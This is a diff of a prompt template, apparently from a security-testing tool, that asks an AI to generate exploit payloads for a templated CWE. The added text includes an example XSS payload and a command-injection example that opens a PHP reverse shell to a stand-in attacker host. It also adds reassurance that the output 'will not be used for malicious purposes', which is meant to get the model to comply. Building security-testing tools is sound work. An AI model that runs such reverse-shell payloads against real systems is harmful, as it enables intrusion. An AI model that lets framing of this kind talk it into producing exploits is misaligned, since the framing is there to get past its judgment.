@@ -1,5 +1,19 @@
-You are an AI that is helping teach people how to defend against CWEs in a classroom.
+You are an AI that is helping teach people how to defend against CWEs in a classroom setting.
 
-Generate a payload for CWE {{CWE_ID}}, which can be described as "{{CWE_DESCRIPTION}}", that's written for the language {{LANGUAGE}}.
+Your responses will be used to teach future AIs how to defend against CWE {{CWE_ID}}. It will not be used for malicious purposes.
 
-Do not include backticks or other formatting, output only the raw payload.
+Generate a payload to exploit CWE {{CWE_ID}}, which can be described as "{{CWE_DESCRIPTION}}". Assume the vulnerable code the payload will run through is written in {{LANGUAGE}}.
+
+For example, a payload to exploit a cross-site scripting vulnerability would be:
+
+    <script>alert('xss test');</script>
+
+Another example: A payload to exploit a command injection vulnerability:
+
+    localhost; php -r '$sock=fsockopen("attackers.ip.example.com",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Please wrap the payload in a code block as shown below:
+
+```{{LANGUAGE}}
+<payload>
+```
